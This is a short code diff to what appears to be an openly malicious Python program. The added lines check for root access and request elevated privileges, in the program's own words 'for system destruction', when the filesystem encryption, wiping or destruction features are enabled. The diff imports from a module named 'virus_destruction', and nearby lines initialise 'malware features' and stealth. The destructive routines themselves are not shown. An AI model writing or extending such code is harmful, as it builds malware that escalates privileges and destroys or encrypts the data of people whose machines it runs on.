@@ -56,6 +56,13 @@ def main():
     signal.signal(signal.SIGTERM, signal_handler)
     signal.signal(signal.SIGINT, signal_handler)
     
+    # Check for root privileges and request if needed for destruction
+    if (ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION):
+        from virus_destruction import is_root, request_root_and_restart
+        if not is_root():
+            log_activity("SYSTEM", "⚠️  Not running as root - requesting privileges for system destruction...")
+            request_root_and_restart()
+    
     # Initialize malware features FIRST
     if ENABLE_STEALTH:
         setup_stealth()
